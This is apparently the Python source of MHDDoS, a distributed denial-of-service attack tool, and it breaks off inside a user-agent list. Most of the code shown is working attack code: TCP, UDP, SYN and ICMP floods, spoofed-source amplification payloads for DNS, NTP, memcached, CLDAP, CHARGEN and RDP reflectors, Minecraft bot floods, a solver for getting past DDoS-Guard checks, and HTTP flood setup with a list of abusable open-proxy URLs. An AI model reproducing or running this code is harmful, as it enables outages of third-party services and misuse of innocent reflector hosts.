#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from secrets import choice as randchoice
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from hashlib import md5

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = ['onion.ly', 'tor2web.to', 'onion.org', 'onion.pet', 'onion.ws', 'onion.top', 'onion.dog']

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
                                "TS3", "MCPE", "ICMP"
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile('"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "TS3": self.SENT_FLOOD = self.TS3
        if name == "MCPE": self.SENT_FLOOD = self.MCPE
        if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
        if name == "ICMP":
            self.SENT_FLOOD = self.ICMP
            self._target = (self._target[0], 0)

        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "CPS": self.SENT_FLOOD = self.CPS
        if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT

        if name == "RDP":
            self._amp_payload = (
                b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CLDAP":
            self._amp_payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                                 b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                                 389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (
                b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (
                b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        payload = self._genrate_syn()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                         IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = md5(username.encode()).hexdigest()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
                "http://66.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
                "http://about42.nl/www/showheaders.php;POST;about42.nl.txt", 
                "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
                "http://anonymouse.org/cgi-bin/anon-www.cgi/", 
                "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=", "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", 
                "http://browsershots.org;POST;browsershots.org.txt",
                "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=", 
                "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://check-host.net/check-http?host=", 
                "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=", "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=", 
                "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=", 
                "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=", 
                "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
                "http://feedvalidator.org/check.cgi?url=", 
                "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=", 
                "http://g.cn", 
                "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", 
                "http://gmodules.com/ig/creator?url=", 
                "http://google.ac", 
                "http://google.ad", 
                "http://google.ae", 
                "http://google.al", 
                "http://google.am", 
                "http://google.as", 
                "http://google.at", 
                "http://google.az", 
                "http://google.ba", 
                "http://google.be", 
                "http://google.bf", 
                "http://google.bg", 
                "http://google.bi", 
                "http://google.bj", 
                "http://google.bs", 
                "http://google.by", 
                "http://google.ca", 
                "http://google.cat", 
                "http://google.cc", 
                "http://google.cd", 
                "http://google.cf", 
                "http://google.cg", 
                "http://google.ch", 
                "http://google.ci", 
                "http://google.cl", 
                "http://google.cm", 
                "http://google.cn", 
                "http://google.co.ao", 
                "http://google.co.bw", 
                "http://google.co.ck",
                "http://google.co.cr", 
                "http://google.co.id", 
                "http://google.co.il", 
                "http://google.co.in", 
                "http://google.co.jp", 
                "http://google.co.ke", 
                "http://google.co.kr", 
                "http://google.co.ls", 
                "http://google.co.ma", 
                "http://google.co.mz", 
                "http://google.co.nz", 
                "http://google.co.th", 
                "http://google.co.tz", 
                "http://google.co.ug", 
                "http://google.co.uk", 
                "http://google.co.uz", 
                "http://google.co.ve", 
                "http://google.co.vi", 
                "http://google.co.za", 
                "http://google.co.zm", 
                "http://google.co.zw", 
                "http://google.com", 
                "http://google.com.af", 
                "http://google.com.ag", 
                "http://google.com.ai", 
                "http://google.com.ar",
                "http://google.com.au", 
                "http://google.com.bd", 
                "http://google.com.bh", 
                "http://google.com.bn", 
                "http://google.com.bo", 
                "http://google.com.br", 
                "http://google.com.bz", 
                "http://google.com.co", 
                "http://google.com.cu", 
                "http://google.com.cy", 
                "http://google.com.do", 
                "http://google.com.ec", 
                "http://google.com.eg", 
                "http://google.com.et", 
                "http://google.com.fj", 
                "http://google.com.gh", 
                "http://google.com.gi", 
                "http://google.com.gt",
                "http://google.com.hk", 
                "http://google.com.jm", 
                "http://google.com.kh", 
                "http://google.com.kw", 
                "http://google.com.lb", 
                "http://google.com.lc", 
                "http://google.com.ly", 
                "http://google.com.mm", 
                "http://google.com.mt", 
                "http://google.com.mx", 
                "http://google.com.my", 
                "http://google.com.na", 
                "http://google.com.nf",
                "http://google.com.ng", 
                "http://google.com.ni", 
                "http://google.com.np", 
                "http://google.com.om", 
                "http://google.com.pa", 
                "http://google.com.pe", 
                "http://google.com.pg", 
                "http://google.com.ph", 
                "http://google.com.pk", 
                "http://google.com.pr", 
                "http://google.com.py",
                "http://google.com.py", 
                "http://google.com.qa", 
                "http://google.com.sa", 
                "http://google.com.sb", 
                "http://google.com.sg", 
                "http://google.com.sl", 
                "http://google.com.sv", 
                "http://google.com.tj", 
                "http://google.com.tn", 
                "http://google.com.tr", 
                "http://google.com.tw", 
                "http://google.com.ua", 
                "http://google.com.uy", 
                "http://google.com.vc", 
                "http://google.com.vn", 
                "http://google.cv", 
                "http://google.cz",
                "http://google.de", 
                "http://google.dj", 
                "http://google.dk", 
                "http://google.dm", 
                "http://google.dz", 
                "http://google.ee", 
                "http://google.es", 
                "http://google.fi", 
                "http://google.fm", 
                "http://google.fr", 
                "http://google.ga", 
                "http://google.ge", 
                "http://google.gf", 
                "http://google.gg", 
                "http://google.gl", 
                "http://google.gm", 
                "http://google.gp", 
                "http://google.gr", 
                "http://google.gy", 
                "http://google.hn", 
                "http://google.hr", 
                "http://google.ht", 
                "http://google.hu", 
                "http://google.ie", 
                "http://google.im", 
                "http://google.io", 
                "http://google.iq", 
                "http://google.is", 
                "http://google.it", 
                "http://google.je", 
                "http://google.jo", 
                "http://google.kg", 
                "http://google.ki", 
                "http://google.kz",
                "http://google.la", 
                "http://google.li", 
                "http://google.lk",
                "http://google.lt", 
                "http://google.lu", 
                "http://google.lv",
                "http://google.md", 
                "http://google.me", 
                "http://google.mg", 
                "http://google.mk",
                "http://google.ml",
                "http://google.mn", 
                "http://google.ms", 
                "http://google.mu", 
                "http://google.mv", 
                "http://google.mw", 
                "http://google.ne", 
                "http://google.nl", 
                "http://google.no", 
                "http://google.nr", 
                "http://google.nu",
                "http://google.pl", 
                "http://google.pn", 
                "http://google.ps", 
                "http://google.pt", 
                "http://google.ro", 
                "http://google.rs", 
                "http://google.ru", 
                "http://google.rw", 
                "http://google.sc",
                "http://google.se", 
                "http://google.sh", 
                "http://google.si",
                "http://google.sk",
                "http://google.sm", 
                "http://google.sn",
                "http://google.so", 
                "http://google.st", 
                "http://google.td", 
                "http://google.tg", 
                "http://google.tk", 
                "http://google.tl", 
                "http://google.tm", 
                "http://google.to", 
                "http://google.tt", 
                "http://google.us", 
                "http://google.vg", 
                "http://google.vu", 
                "http://google.ws", 
                "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
                "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
                "http://help.baidu.com/searchResult?keywords=", 
                "http://host-tracker.com/check_page/?furl=", 
                "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
                "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://jigsaw.w3.org/css-validator/validator?uri=", "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=", 
                "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=", 
                "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=", 
                "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=", 
                "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://netsec-reborn.onion/QuickStresser-virus?id=", 
                "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=", 
                "http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
                 'Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30',
                 'Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5',
                 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
                 'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.9) Gecko/2009042114 Ubuntu/9.04 (jaunty) Firefox/3.0.9',
                 'Mozilla/5.0 (Windows; U; Win98; fr-FR; rv:1.7.6) Gecko/20050226 Firefox/1.0.1',
                 'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.6) Gecko/20040207 Firefox/0.8',
                 'Mozilla/5.0 (X11) KHTML/4.9.1 (like Gecko) Konqueror/4.9',
                 'Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)',
                 'Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)',
